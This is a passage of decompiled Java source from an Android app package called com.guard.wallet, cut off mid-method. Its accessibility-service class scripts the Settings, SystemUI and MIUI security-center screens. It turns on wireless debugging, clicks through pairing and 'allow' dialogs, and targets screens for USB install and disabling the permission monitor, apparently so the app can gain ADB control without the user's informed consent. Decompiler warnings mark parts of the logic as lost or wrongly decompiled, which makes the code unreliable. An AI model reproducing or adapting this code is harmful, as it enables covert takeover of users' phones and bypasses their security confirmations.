package p012o;

import a1.AbstractC0026q;
import android.graphics.Rect;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.condition.BoolCondition;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.condition.TargetActionCondition;
import com.guard.wallet.entity.CheckedResult;
import com.guard.wallet.entity.PairPortAndCodeResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.helper.AbstractC0184g;
import com.guard.wallet.req.EventSubscribe;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.thread.AbstractC0243l;
import com.guard.wallet.thread.CallableC0238g;
import com.guard.wallet.thread.CallableC0239h;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0250f;
import com.guard.wallet.utils.AbstractC0251g;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;
import org.bouncycastle.i18n.TextBundle;
import p000a.AbstractC0000a;
import p002e.C0262b;
import p005h.C0318e;
import p014r.EnumC0894g;
import p022z.C0981d;

/* loaded from: classes.dex */
public final class a0 extends C0416e {

    /* renamed from: n */
    public final ScheduledExecutorService f839n;

    /* renamed from: o */
    public final ConcurrentLinkedQueue f840o;

    /* renamed from: p */
    public final AtomicReference f841p;

    /* renamed from: q */
    public final ReentrantLock f842q;

    /* renamed from: r */
    public final AtomicBoolean f843r;

    /* renamed from: s */
    public boolean f844s;

    /* renamed from: t */
    public boolean f845t;

    /* renamed from: u */
    public boolean f846u;

    public a0() {
        super(E0(), "com.android.settings");
        ScheduledExecutorService newSingleThreadScheduledExecutor = Executors.newSingleThreadScheduledExecutor();
        this.f839n = newSingleThreadScheduledExecutor;
        this.f840o = new ConcurrentLinkedQueue();
        this.f841p = new AtomicReference(EnumC0894g.PAIR_DEPT_UNKNOWN);
        this.f842q = new ReentrantLock();
        this.f843r = new AtomicBoolean(false);
        this.f844s = false;
        this.f845t = false;
        this.f846u = false;
        try {
            long j2 = AbstractC0249e.m624m() ? 180L : 120L;
            RunnableC0437z runnableC0437z = new RunnableC0437z(this, 0);
            TimeUnit timeUnit = TimeUnit.SECONDS;
            newSingleThreadScheduledExecutor.schedule(runnableC0437z, j2, timeUnit);
            newSingleThreadScheduledExecutor.schedule(new RunnableC0437z(this, 1), 30L, timeUnit);
        } catch (Exception e2) {
            AbstractC0026q.m186s("PairAccessibilityDelegate", e2);
        }
    }

    public static ListenWindow A0() {
        CombineFilter combineFilter;
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_FAILED_4_TEXT"))) {
            combineFilter = null;
        } else {
            combineFilter = new CombineFilter();
            StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
            AbstractC0413b.m1028v("PAIR_FAILED_4_TEXT", m1008b, combineFilter, m1008b);
        }
        if (combineFilter == null) {
            return null;
        }
        ListenWindow listenWindow = new ListenWindow("com.android.settings", null);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(combineFilter);
        listenWindow.getEventSubscribes().add(C0());
        return listenWindow;
    }

    public static ListenWindow B0() {
        CombineFilter combineFilter;
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_FAILED_TEXT"))) {
            combineFilter = null;
        } else {
            combineFilter = new CombineFilter();
            StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
            AbstractC0413b.m1028v("PAIR_FAILED_TEXT", m1008b, combineFilter, m1008b);
        }
        if (combineFilter == null) {
            return null;
        }
        ListenWindow listenWindow = new ListenWindow("com.android.settings", null);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(combineFilter);
        listenWindow.getEventSubscribes().add(C0());
        return listenWindow;
    }

    public static EventSubscribe C0() {
        EventSubscribe eventSubscribe = new EventSubscribe();
        eventSubscribe.setListenType(0);
        eventSubscribe.setSourceRule(0);
        eventSubscribe.setCombineFilter(m989V());
        eventSubscribe.setReplyActions(new LinkedList());
        TargetActionCondition targetActionCondition = new TargetActionCondition();
        targetActionCondition.setActionType(1);
        targetActionCondition.setActionName("click");
        eventSubscribe.getReplyActions().add(targetActionCondition);
        eventSubscribe.setEventTypes(new HashSet<>());
        eventSubscribe.getEventTypes().add(32);
        eventSubscribe.getEventTypes().add(16384);
        return eventSubscribe;
    }

    public static LinkedList E0() {
        LinkedList linkedList = new LinkedList();
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "com.android.settings.Settings$DevelopmentSettingsDashboardActivity");
        AbstractC0413b.m1024r(listenWindow).add(32);
        listenWindow.getEventTypes().add(16384);
        linkedList.add(listenWindow);
        ListenWindow listenWindow2 = new ListenWindow("com.android.settings", "com.android.settings.Settings$DevelopmentSettingsActivity");
        listenWindow2.setEventTypes(new HashSet<>());
        listenWindow2.getEventTypes().add(32);
        listenWindow2.getEventTypes().add(16384);
        linkedList.add(listenWindow2);
        linkedList.add(m983I());
        ListenWindow listenWindow3 = new ListenWindow("com.android.settings", "com.android.settings.SubSettings");
        listenWindow3.setEventTypes(new HashSet<>());
        listenWindow3.getEventTypes().add(32);
        listenWindow3.getEventTypes().add(16384);
        linkedList.add(listenWindow3);
        linkedList.add(s0());
        ListenWindow listenWindow4 = new ListenWindow("com.android.settings", "com.hihonor.settingslib.SubSettings");
        listenWindow4.setEventTypes(new HashSet<>());
        listenWindow4.getEventTypes().add(32);
        listenWindow4.getEventTypes().add(16384);
        linkedList.add(listenWindow4);
        ListenWindow listenWindow5 = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
        listenWindow5.setEventTypes(new HashSet<>());
        listenWindow5.getEventTypes().add(32);
        listenWindow5.getEventTypes().add(16384);
        linkedList.add(listenWindow5);
        ListenWindow Y0 = Y0();
        if (Y0 != null) {
            linkedList.add(Y0);
        }
        ListenWindow Z0 = Z0();
        if (Z0 != null) {
            linkedList.add(Z0);
        }
        ListenWindow listenWindow6 = new ListenWindow("com.android.systemui", "android.app.Dialog");
        listenWindow6.setEventTypes(new HashSet<>());
        listenWindow6.getEventTypes().add(32);
        listenWindow6.getEventTypes().add(16384);
        listenWindow6.getEventTypes().add(1);
        linkedList.add(listenWindow6);
        ListenWindow listenWindow7 = new ListenWindow("com.android.settings", null);
        listenWindow7.setEventTypes(new HashSet<>());
        listenWindow7.getEventTypes().add(32);
        listenWindow7.getEventTypes().add(16384);
        linkedList.add(listenWindow7);
        ListenWindow B0 = B0();
        if (B0 != null) {
            linkedList.add(B0);
        }
        ListenWindow y02 = y0();
        if (y02 != null) {
            linkedList.add(y02);
        }
        ListenWindow z02 = z0();
        if (z02 != null) {
            linkedList.add(z02);
        }
        ListenWindow A0 = A0();
        if (A0 != null) {
            linkedList.add(A0);
        }
        linkedList.add(M0());
        linkedList.add(I0());
        return linkedList;
    }

    public static C0981d F0() {
        CombineFilter combineFilter;
        CombineFiltersWithOr combineFiltersWithOr = new CombineFiltersWithOr(new LinkedList());
        CombineFilter combineFilter2 = null;
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_DISABLE_PERMISSION_MONITOR_TEXT"))) {
            combineFilter = null;
        } else {
            combineFilter = new CombineFilter();
            StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
            AbstractC0413b.m1028v("PAIR_DISABLE_PERMISSION_MONITOR_TEXT", m1008b, combineFilter, m1008b);
        }
        if (combineFilter != null) {
            combineFiltersWithOr.getFilters().add(combineFilter);
        }
        if (!AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_DISABLE_PERMISSION_MONITOR_2_TEXT"))) {
            combineFilter2 = new CombineFilter();
            StringCondition m1008b2 = AbstractC0413b.m1008b(combineFilter2, AbstractC0000a.m7c(combineFilter2, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
            AbstractC0413b.m1028v("PAIR_DISABLE_PERMISSION_MONITOR_2_TEXT", m1008b2, combineFilter2, m1008b2);
        }
        if (combineFilter2 != null) {
            combineFiltersWithOr.getFilters().add(combineFilter2);
        }
        return new C0981d(combineFiltersWithOr, 2, 1);
    }

    /* JADX WARN: Code restructure failed: missing block: B:46:0x00ad, code lost:
    
        if (com.guard.wallet.utils.AbstractC0249e.m618g() != false) goto L33;
     */
    /* renamed from: H */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static void m982H(a0 a0Var) {
        String str;
        boolean z2;
        a0Var.getClass();
        try {
            boolean m995L = a0Var.m995L();
            ConcurrentLinkedQueue concurrentLinkedQueue = a0Var.f840o;
            boolean z3 = false;
            if (m995L) {
                Log.d("PairAccessibilityDelegate", "pairInDevOption 窗口匹配");
                AbstractC0184g.m354h(10);
                a0Var.m1062G();
                Log.d("PairAccessibilityDelegate", "active root complete");
                UiObject f02 = a0Var.f0();
                if (f02 != null) {
                    Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
                    if (AbstractC0249e.m623l() && !AbstractC0251g.m638K() && a0Var.T0(f02)) {
                        concurrentLinkedQueue.remove("pairInDevOption");
                    }
                    UiObject G0 = a0Var.G0(f02);
                    if (G0 != null) {
                        Log.d("PairAccessibilityDelegate", "无线调试栏目查找成功:" + G0.toString());
                        UiObject findParentUtilCombine = G0.findParentUtilCombine(m987T());
                        if (findParentUtilCombine != null) {
                            Log.d("PairAccessibilityDelegate", "无线调试可点击栏目查找成功");
                            AbstractC0184g.m354h(15);
                            if (!AbstractC0026q.m151B(G0.text()) && G0.text().contains(AbstractC0250f.m627b("PAIR_DISABLE_ADB_WITH_AUTH_TIMEOUT_TEXT")) && m986S(findParentUtilCombine)) {
                                Log.d("PairAccessibilityDelegate", "依禁用ADB节点位置进入无线调试栏目");
                                AbstractC0184g.m354h(25);
                            } else {
                                if (AbstractC0249e.m624m()) {
                                    if (Build.VERSION.SDK_INT <= 30) {
                                        z2 = true;
                                    }
                                    z2 = false;
                                }
                                if (z2 && m985R(findParentUtilCombine)) {
                                    Log.d("PairAccessibilityDelegate", "无线调试已勾选");
                                    AbstractC0184g.m354h(20);
                                }
                                if (findParentUtilCombine.click()) {
                                    a0Var.f841p.set(EnumC0894g.PAIR_DEPT_PAIR_LEAVE_DEV_OPT);
                                    Log.d("PairAccessibilityDelegate", "点击进入无线调试栏目");
                                    AbstractC0184g.m354h(25);
                                    z3 = true;
                                } else {
                                    Log.d("PairAccessibilityDelegate", "点击进入无线调试栏目失败");
                                }
                            }
                        } else {
                            str = "无线调试可点击栏目查找失败";
                        }
                    } else {
                        str = "无线调试栏目查找失败";
                    }
                } else {
                    str = "开发者选项窗口滚动视图查找失败,重置开发者选项窗口";
                }
                Log.e("PairAccessibilityDelegate", str);
            }
            if (z3) {
                return;
            }
            concurrentLinkedQueue.remove("pairInDevOption");
        } catch (Exception e2) {
            AbstractC0026q.m186s("PairAccessibilityDelegate", e2);
        }
    }

    public static CombineFiltersWithOr H0() {
        CombineFiltersWithOr combineFiltersWithOr = new CombineFiltersWithOr();
        combineFiltersWithOr.setFilters(new LinkedList());
        List<CombineFilter> filters = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setStringConditions(new LinkedList());
        combineFilter.setBoolConditions(new LinkedList());
        StringCondition stringCondition = new StringCondition();
        stringCondition.setProperty("className");
        stringCondition.setEquals("androidx.recyclerview.widget.RecyclerView");
        combineFilter.getStringConditions().add(stringCondition);
        combineFilter.getBoolConditions().add(new BoolCondition("scrollable", true, true));
        filters.add(combineFilter);
        List<CombineFilter> filters2 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter2 = new CombineFilter();
        combineFilter2.setStringConditions(new LinkedList());
        combineFilter2.setBoolConditions(new LinkedList());
        StringCondition stringCondition2 = new StringCondition();
        stringCondition2.setProperty("className");
        stringCondition2.setEquals("android.widget.ListView");
        combineFilter2.getStringConditions().add(stringCondition2);
        combineFilter2.getBoolConditions().add(new BoolCondition("scrollable", true, true));
        filters2.add(combineFilter2);
        List<CombineFilter> filters3 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter3 = new CombineFilter();
        combineFilter3.setStringConditions(new LinkedList());
        combineFilter3.setBoolConditions(new LinkedList());
        StringCondition stringCondition3 = new StringCondition();
        stringCondition3.setProperty("className");
        stringCondition3.setEquals("android.widget.ScrollView");
        combineFilter3.getStringConditions().add(stringCondition3);
        combineFilter3.getBoolConditions().add(new BoolCondition("scrollable", true, true));
        filters3.add(combineFilter3);
        List<CombineFilter> filters4 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter4 = new CombineFilter();
        combineFilter4.setStringConditions(new LinkedList());
        combineFilter4.setBoolConditions(new LinkedList());
        combineFilter4.getBoolConditions().add(new BoolCondition("scrollable", true, true));
        filters4.add(combineFilter4);
        return combineFiltersWithOr;
    }

    /* renamed from: I */
    public static ListenWindow m983I() {
        ListenWindow listenWindow = new ListenWindow("com.android.settings", null);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.setEventTypes(new HashSet<>());
        AbstractC0413b.m1023q(32, listenWindow.getEventTypes(), listenWindow).add(16384);
        List<CombineFilter> matchs = listenWindow.getMatchs();
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        m1008b.setContains(AbstractC0250f.m627b("PAIR_ALLOW_DEVELOPER_SETTING_TEXT"));
        combineFilter.getStringConditions().add(m1008b);
        matchs.add(combineFilter);
        return listenWindow;
    }

    public static ListenWindow I0() {
        ListenWindow listenWindow = new ListenWindow("com.miui.securitycenter", "miuix.appcompat.app.AlertDialog");
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(L0());
        listenWindow.setEventTypes(new HashSet<>());
        AbstractC0413b.m1023q(16384, AbstractC0413b.m1023q(32, listenWindow.getEventTypes(), listenWindow), listenWindow).add(2048);
        return listenWindow;
    }

    /* renamed from: J */
    public static ListenWindow m984J() {
        ListenWindow listenWindow = new ListenWindow("com.android.systemui", "android.app.Dialog");
        AbstractC0413b.m1023q(16384, AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow), listenWindow).add(1);
        return listenWindow;
    }

    public static CombineFilter J0() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.Button"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("PAIR_ACCEPT_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    public static CombineFilter K0() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.Button"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("PAIR_NEXT_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    public static CombineFilter L0() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        m1008b.setContains(AbstractC0250f.m627b("PAIR_SECURITY_OPENING_TEXT"));
        combineFilter.getStringConditions().add(m1008b);
        return combineFilter;
    }

    public static ListenWindow M0() {
        ListenWindow listenWindow = new ListenWindow("com.miui.securitycenter", "com.miui.permcenter.install.AdbInputApplyActivity");
        AbstractC0413b.m1023q(16384, AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow), listenWindow).add(2048);
        return listenWindow;
    }

    public static ListenWindow O0() {
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "com.android.settings.SubSettings");
        listenWindow.setMatchs(new LinkedList());
        listenWindow.setEventTypes(new HashSet<>());
        AbstractC0413b.m1023q(32, listenWindow.getEventTypes(), listenWindow).add(16384);
        listenWindow.getMatchs().add(m991X());
        return listenWindow;
    }

    public static ListenWindow P0() {
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "com.android.settings.SubSettings");
        listenWindow.setMatchs(new LinkedList());
        listenWindow.setEventTypes(new HashSet<>());
        AbstractC0413b.m1023q(32, listenWindow.getEventTypes(), listenWindow).add(16384);
        listenWindow.getMatchs().add(m993Z());
        return listenWindow;
    }

    public static CombineFilter Q0() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(AbstractC0000a.m7c(combineFilter, "className", "android.widget.Switch"));
        return combineFilter;
    }

    /* renamed from: R */
    public static boolean m985R(UiObject uiObject) {
        AtomicInteger atomicInteger = new AtomicInteger(0);
        boolean m637J = AbstractC0251g.m637J();
        while (!m637J) {
            try {
                if (atomicInteger.incrementAndGet() > 10) {
                    break;
                }
                CheckedResult h02 = h0(uiObject);
                if (h02.isClicked()) {
                    Log.d("PairAccessibilityDelegate", "无线调试勾选框已点击");
                    AbstractC0251g.T0(10);
                }
                if (h02.isChecked()) {
                    Log.d("PairAccessibilityDelegate", "已勾选无线调试");
                }
                m637J = AbstractC0251g.m637J();
            } catch (Exception e2) {
                AbstractC0026q.m186s("PairAccessibilityDelegate", e2);
            }
        }
        return m637J;
    }

    public static CombineFilter R0() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        m1008b.setContains(AbstractC0250f.m627b("PAIR_ALLOW_USB_INSTALL_TEXT"));
        combineFilter.getStringConditions().add(m1008b);
        return combineFilter;
    }

    /* renamed from: S */
    public static boolean m986S(UiObject uiObject) {
        try {
            Log.d("PairAccessibilityDelegate", "禁用ADB调试栏目查找成功");
            Rect rect = new Rect(uiObject.boundsInScreen().left, uiObject.boundsInScreen().top - 200, uiObject.boundsInScreen().right, uiObject.boundsInScreen().top);
            if (!AbstractC0251g.m672s(Integer.valueOf(rect.centerX()), Integer.valueOf(rect.centerY()))) {
                return false;
            }
            Log.d("PairAccessibilityDelegate", "根据屏幕左边点击无线调试栏目完成");
            AbstractC0184g.m354h(20);
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("PairAccessibilityDelegate", e2);
            return false;
        }
    }

    public static CombineFilter S0() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("PAIR_USB_SECURITY_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    /* renamed from: T */
    public static CombineFilter m987T() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setBoolConditions(new LinkedList());
        combineFilter.getBoolConditions().add(new BoolCondition("clickable", true, true));
        return combineFilter;
    }

    /* renamed from: U */
    public static CombineFilter m988U() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(AbstractC0000a.m6b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.Button"), "id", "android:id/button1"));
        return combineFilter;
    }

    public static ListenWindow U0() {
        CombineFilter V0 = V0();
        if (V0 == null) {
            return null;
        }
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "com.android.settings.SubSettings");
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(V0);
        listenWindow.setEventTypes(new HashSet<>());
        AbstractC0413b.m1023q(32, listenWindow.getEventTypes(), listenWindow).add(16384);
        return listenWindow;
    }

    /* renamed from: V */
    public static CombineFilter m989V() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.Button"), TextBundle.TEXT_ENTRY);
        m1008b.setContains(AbstractC0250f.m627b("PAIR_CONFIRM_TEXT"));
        combineFilter.getStringConditions().add(m1008b);
        return combineFilter;
    }

    public static CombineFilter V0() {
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_WIFI_DEBUG_2_TEXT"))) {
            return null;
        }
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("PAIR_WIFI_DEBUG_2_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    /* renamed from: W */
    public static ListenWindow m990W() {
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "com.android.settings.Settings$DevelopmentSettingsActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static ListenWindow W0() {
        CombineFilter X0 = X0();
        if (X0 == null) {
            return null;
        }
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "com.android.settings.SubSettings");
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(X0);
        listenWindow.setEventTypes(new HashSet<>());
        AbstractC0413b.m1023q(32, listenWindow.getEventTypes(), listenWindow).add(16384);
        return listenWindow;
    }

    /* renamed from: X */
    public static CombineFilter m991X() {
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_DEVELOPERS_OPTION_TEXT"))) {
            return null;
        }
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("PAIR_DEVELOPERS_OPTION_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    public static CombineFilter X0() {
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_WIFI_DEBUG_TEXT"))) {
            return null;
        }
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("PAIR_WIFI_DEBUG_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    /* renamed from: Y */
    public static ListenWindow m992Y() {
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "com.android.settings.Settings$DevelopmentSettingsDashboardActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static ListenWindow Y0() {
        CombineFilter u02 = u0();
        if (u02 == null) {
            return null;
        }
        ListenWindow listenWindow = new ListenWindow(null, null);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(u02);
        listenWindow.setEventTypes(new HashSet<>());
        AbstractC0413b.m1023q(32, listenWindow.getEventTypes(), listenWindow).add(16384);
        return listenWindow;
    }

    /* renamed from: Z */
    public static CombineFilter m993Z() {
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_DEVELOPER_OPTION_TEXT"))) {
            return null;
        }
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("PAIR_DEVELOPER_OPTION_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    public static ListenWindow Z0() {
        CombineFilter combineFilter;
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_DEVICE_USE_PAIR_CODE_2_TEXT"))) {
            combineFilter = null;
        } else {
            combineFilter = new CombineFilter();
            combineFilter.setStringConditions(new LinkedList());
            StringCondition stringCondition = new StringCondition();
            stringCondition.setProperty(TextBundle.TEXT_ENTRY);
            stringCondition.setContains(AbstractC0250f.m627b("PAIR_DEVICE_USE_PAIR_CODE_2_TEXT"));
            combineFilter.getStringConditions().add(stringCondition);
        }
        if (combineFilter == null) {
            return null;
        }
        ListenWindow listenWindow = new ListenWindow(null, null);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(combineFilter);
        listenWindow.setEventTypes(new HashSet<>());
        AbstractC0413b.m1023q(32, listenWindow.getEventTypes(), listenWindow).add(16384);
        return listenWindow;
    }

    public static CombineFiltersWithOr a0() {
        CombineFilter combineFilter;
        CombineFilter combineFilter2;
        CombineFilter combineFilter3;
        CombineFilter combineFilter4;
        CombineFilter combineFilter5;
        CombineFiltersWithOr combineFiltersWithOr = new CombineFiltersWithOr();
        combineFiltersWithOr.setFilters(new LinkedList());
        CombineFilter combineFilter6 = null;
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_DEVELOPER_OPTION_TEXT"))) {
            combineFilter = null;
        } else {
            combineFilter = new CombineFilter();
            StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.Switch"), "desc");
            AbstractC0413b.m1028v("PAIR_DEVELOPER_OPTION_TEXT", m1008b, combineFilter, m1008b);
        }
        if (combineFilter != null) {
            combineFiltersWithOr.getFilters().add(combineFilter);
        }
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_DEVELOPERS_OPTION_TEXT"))) {
            combineFilter2 = null;
        } else {
            combineFilter2 = new CombineFilter();
            StringCondition m1008b2 = AbstractC0413b.m1008b(combineFilter2, AbstractC0000a.m7c(combineFilter2, "className", "android.widget.Switch"), "desc");
            AbstractC0413b.m1028v("PAIR_DEVELOPERS_OPTION_TEXT", m1008b2, combineFilter2, m1008b2);
        }
        if (combineFilter2 != null) {
            combineFiltersWithOr.getFilters().add(combineFilter2);
        }
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_DEVELOPER_OPTION_2_TEXT"))) {
            combineFilter3 = null;
        } else {
            combineFilter3 = new CombineFilter();
            StringCondition m1008b3 = AbstractC0413b.m1008b(combineFilter3, AbstractC0000a.m7c(combineFilter3, "className", "android.widget.Switch"), "desc");
            AbstractC0413b.m1028v("PAIR_DEVELOPER_OPTION_2_TEXT", m1008b3, combineFilter3, m1008b3);
        }
        if (combineFilter3 != null) {
            combineFiltersWithOr.getFilters().add(combineFilter3);
        }
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_DEVELOPER_OPTION_3_TEXT"))) {
            combineFilter4 = null;
        } else {
            combineFilter4 = new CombineFilter();
            StringCondition m1008b4 = AbstractC0413b.m1008b(combineFilter4, AbstractC0000a.m7c(combineFilter4, "className", "android.widget.Switch"), "desc");
            AbstractC0413b.m1028v("PAIR_DEVELOPER_OPTION_3_TEXT", m1008b4, combineFilter4, m1008b4);
        }
        if (combineFilter4 != null) {
            combineFiltersWithOr.getFilters().add(combineFilter4);
        }
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_DEVELOPER_OPTION_4_TEXT"))) {
            combineFilter5 = null;
        } else {
            combineFilter5 = new CombineFilter();
            StringCondition m1008b5 = AbstractC0413b.m1008b(combineFilter5, AbstractC0000a.m7c(combineFilter5, "className", "android.widget.Switch"), "desc");
            AbstractC0413b.m1028v("PAIR_DEVELOPER_OPTION_4_TEXT", m1008b5, combineFilter5, m1008b5);
        }
        if (combineFilter5 != null) {
            combineFiltersWithOr.getFilters().add(combineFilter5);
        }
        if (!AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_DEVELOPER_OPTION_5_TEXT"))) {
            combineFilter6 = new CombineFilter();
            StringCondition m1008b6 = AbstractC0413b.m1008b(combineFilter6, AbstractC0000a.m7c(combineFilter6, "className", "android.widget.Switch"), "desc");
            AbstractC0413b.m1028v("PAIR_DEVELOPER_OPTION_5_TEXT", m1008b6, combineFilter6, m1008b6);
        }
        if (combineFilter6 != null) {
            combineFiltersWithOr.getFilters().add(combineFilter6);
        }
        return combineFiltersWithOr;
    }

    public static CombineFiltersWithOr b0() {
        CombineFilter combineFilter;
        CombineFilter combineFilter2;
        CombineFilter combineFilter3;
        CombineFiltersWithOr combineFiltersWithOr = new CombineFiltersWithOr();
        combineFiltersWithOr.setFilters(new LinkedList());
        CombineFilter m993Z = m993Z();
        if (m993Z != null) {
            combineFiltersWithOr.getFilters().add(m993Z);
        }
        CombineFilter m991X = m991X();
        if (m991X != null) {
            combineFiltersWithOr.getFilters().add(m991X);
        }
        CombineFilter combineFilter4 = null;
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_DEVELOPER_OPTION_2_TEXT"))) {
            combineFilter = null;
        } else {
            combineFilter = new CombineFilter();
            StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
            AbstractC0413b.m1028v("PAIR_DEVELOPER_OPTION_2_TEXT", m1008b, combineFilter, m1008b);
        }
        if (combineFilter != null) {
            combineFiltersWithOr.getFilters().add(combineFilter);
        }
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("PAIR_DEVELOPER_OPTION_3_TEXT"))) {
            combineFilter2 = null;
        } else {
            combineFilter2 = new CombineFilter();
